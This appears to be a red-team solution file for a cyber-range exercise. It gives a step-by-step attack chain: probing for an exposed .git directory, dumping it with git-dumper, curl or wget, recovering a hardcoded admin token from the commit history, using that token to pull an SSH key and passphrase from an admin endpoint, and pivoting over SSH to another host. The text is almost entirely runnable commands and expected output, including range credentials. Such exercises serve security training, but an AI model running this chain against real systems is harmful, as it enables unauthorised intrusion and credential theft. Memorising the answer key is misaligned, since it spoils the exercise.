# solve_red.md — M5 · ext-contractor-portal
## Red Team Solution — Exposed .git Directory → Hardcoded Credentials → SSH Key
**Range:** RNG-EXT-01 · SETU DVAAR · OPERATION DEEPSTRIKE
**Vulnerability:** Exposed .git directory — CWE-538
**MITRE:** T1552.001 (Credentials in Files) · T1083 (File and Directory Discovery)

---

## Phase 1 — Discover .git Exposure

```bash
TARGET="http://203.x.x.x:4000"

# Probe for .git/HEAD — the canonical check
curl -s "$TARGET/.git/HEAD"
# Expected: ref: refs/heads/master
```

If you get `ref: refs/heads/master` the `.git` directory is fully exposed.

---

## Phase 2 — Extract Git History

**Method A — git-dumper (recommended, fastest):**
```bash
pip3 install git-dumper
git-dumper "$TARGET/.git" /tmp/rpal-contractor-repo
cd /tmp/rpal-contractor-repo
git log --oneline
```

**Method B — Manual requests:**
```bash
# Read commit log
curl -s "$TARGET/.git/logs/HEAD"

# Extract commit hashes from the log
# Each line: <old-hash> <new-hash> <author> <timestamp> <action> <message>
```

**Method C — wget:**
```bash
wget -q -r --no-parent -R "index.html*" "$TARGET/.git/" -P /tmp/rpal-git
```

---

## Phase 3 — Find Hardcoded Credentials in Git History

```bash
cd /tmp/rpal-contractor-repo   # or wherever git-dumper saved it

# Show all commits
git log --oneline
# Output:
#   abc1234 security: move ADMIN_TOKEN to environment variable
#   def5678 chore: update npm dependencies to latest
#   ghi9012 Initial commit — RPAL Contractor Registration System v1.0

# Check the initial commit — this is where the token was hardcoded
git show ghi9012:app.js | grep -i "admin_token\|token\|secret\|password"
# OR: show the diff that removed it
git diff ghi9012..abc1234 -- app.js | grep "ADMIN_TOKEN"
```

**Expected output:**
```
-const ADMIN_TOKEN = 'RPAL-ADMIN-TOKEN-2024-9c4e2a8f1b7d3e6a';
```

---

## Phase 4 — Use Admin Token to Access SSH Key

```bash
# Call the admin export endpoint with the hardcoded token
curl -s "$TARGET/admin/export" \
  -H "Authorization: Bearer RPAL-ADMIN-TOKEN-2024-9c4e2a8f1b7d3e6a" \
  | python3 -m json.tool
```

**Response contains:**
```json
{
    "pivot_target": {
        "host": "203.x.x.128",
        "port": 22,
        "user": "svc-deploy",
        "passphrase": "Deploy@SSH!RPAL24Corp",
        "ssh_key": "-----BEGIN RSA PRIVATE KEY-----\n..."
    }
}
```

**Extract and use the SSH key:**
```bash
curl -s "$TARGET/admin/export" \
  -H "Authorization: Bearer RPAL-ADMIN-TOKEN-2024-9c4e2a8f1b7d3e6a" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['pivot_target']['ssh_key'])" \
  > /tmp/svc-deploy-rsa

chmod 600 /tmp/svc-deploy-rsa

# Pivot to Range 2
ssh -i /tmp/svc-deploy-rsa -p 22 svc-deploy@203.x.x.128
# Passphrase: Deploy@SSH!RPAL24Corp
```

---
*solve_red.md | M5 ext-contractor-portal | RNG-EXT-01 SETU DVAAR | OPERATION DEEPSTRIKE*
